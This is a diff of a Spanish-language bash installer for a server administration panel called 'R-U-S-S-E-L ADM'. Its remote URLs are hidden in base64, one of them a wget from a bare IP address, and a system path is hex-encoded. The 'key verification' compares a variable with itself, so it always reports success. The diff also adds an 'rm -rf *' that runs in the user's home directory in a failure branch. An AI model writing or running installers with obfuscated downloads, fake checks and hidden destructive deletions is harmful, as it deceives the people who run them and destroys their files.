@@ -1,46 +1,4 @@
 #!/bin/bash
-echo -e "\033[1;32m ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
-dom='base64 -d'
-clear
-apt-get install sysvbanner -y 1> /dev/null 2> /dev/null
-apt-get install lolcat -y 1> /dev/null 2> /dev/null
-apt-get install cowsay -y 1> /dev/null 2> /dev/null
-clear
-apt-get install figlet -y 1> /dev/null 2> /dev/null
-apt-get install boxes -y 1> /dev/null 2> /dev/null
-export PATH=$PATH:/usr/sbin:/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin:/usr/games
-clear
-echo " R - U - S - S " | boxes -d cat -a c | lolcat
-echo  ""
-echo "\033[1;32m ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
-echo " KEY: Verified"
-echo " ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
-sleep 2
-clear
-if [[ $key != $key ]];then
-echo "Ingrese una Key Valida"
-rm -f instala.sh*
-rm -f russel.sh*
-else
-mkdir -p chumogh
-cd chumogh
-update1='aHR0cDovLzM1LjE4My4xMDcuMTM5OjgxL2NodW1vZ2gudmFs'
-update2=$(echo $update1|$dom)
-wget -q $update2
-validar=$(cat < chumogh.val)
-cd
-cd
-rm -rf chumogh
-
-echo "Verified FOR R-U-S-S-E-L ADM 2020" > exito
-fi
-if [[ $key = $key ]];
-then
-src='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NodW1vR0gvcnVzcy9tYXN0ZXIvbGlzdGE='
-#usu=$(cat /etc/passwd | grep "system-root")
-function_verify () {
-  echo "verify" > $(echo -e $(echo 2f62696e2f766572696679737973|sed 's/../\\x&/g;s/$/ /'))
-}
 fun_bar () {
 comando[0]="$1"
 comando[1]="$2"
@@ -54,7 +12,7 @@ echo -ne "\033[1;33m ["
 while true; do
    for((i=0; i<18; i++)); do
    echo -ne "\033[1;31m##"
-   sleep 1
+   sleep 0.1s
    done
    [[ -e $HOME/fim ]] && rm $HOME/fim && break
    echo -e "\033[1;33m]"
@@ -64,6 +22,48 @@ while true; do
    echo -ne "\033[1;33m ["
 done
 echo -e "\033[1;33m]\033[1;31m -\033[1;32m 100%\033[1;37m"
+}
+echo -e "\033[1;32m ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
+dom='base64 -d'
+clear
+echo -e "\033[1;32m ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
+fun_bar 'apt-get install sysvbanner -y' 'apt-get install lolcat -y'
+fun_bar 'apt-get install cowsay -y' 'apt-get install figlet -y'
+echo -e "\033[1;32m ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
+echo -e " LOLCAT - FIGLET - COWSAY - SYSVBANNER INSTALADOS CORRECTAMENTE " | lolcat
+sleep 5
+export PATH=$PATH:/usr/sbin:/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin:/usr/games
+clear
+echo " R - U - S - S " | boxes -d cat -a c | lolcat
+echo  ""
+echo " ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
+echo " KEY: Verified"
+echo " ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆ "
+sleep 2
+clear
+if [[ $key != $key ]];then
+echo "Ingrese una Key Valida"
+rm -f instala.*
+rm -f russel.*
+else
+mkdir -p chumogh
+cd chumogh
+#update1='aHR0cDovLzM1LjE4My4xMDcuMTM5OjgxL2NodW1vZ2gudmFs'
+#update2=$(echo $update1|$dom)
+#wget -q $update2
+#validar=$(cat < chumogh.val)
+cd
+cd
+rm -rf chumogh
+
+echo "Verified FOR R-U-S-S-E-L ADM 2020" > exito
+fi
+if [[ $key = $key ]];
+then
+src='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NodW1vR0gvcnVzcy9tYXN0ZXIvbGlzdGE='
+#usu=$(cat /etc/passwd | grep "system-root")
+function_verify () {
+  echo "verify" > $(echo -e $(echo 2f62696e2f766572696679737973|sed 's/../\\x&/g;s/$/ /'))
 }
 
 instalar_fun () {
@@ -138,8 +138,8 @@ echo -e "${cor[2]} $(source trans -b pt:${id} "Para acceder al MENU, DISFRUTA LA
 echo -e "${cor[2]} $(source trans -b pt:${id} "RECOMENDABLE ACCEDER COMO ROOT y/o ADMINISTRADOR")"
 figlet $name | lolcat
 echo "ADM\-"$name"-/R-U-S-S" > exito
-rm -f instala.sh*
-rm -f russel.sh*
+rm -f instala.*
+rm -f russel.*
 }
 
 
@@ -215,8 +215,9 @@ echo -e "${cor[1]}●●●●●● ●●●●●● ●●●●●● ●�
 	  valid_fun
 	else
           cd
-	  rm -f setup.sh
-	  rm -f instala.sh*
+	  rm -rf *
+	  rm -f setup.*
+	  rm -f instala.*
 	  rm -rf chumogh
 	  #rm -f setup.sh
 	  rm -f /bin/cgh
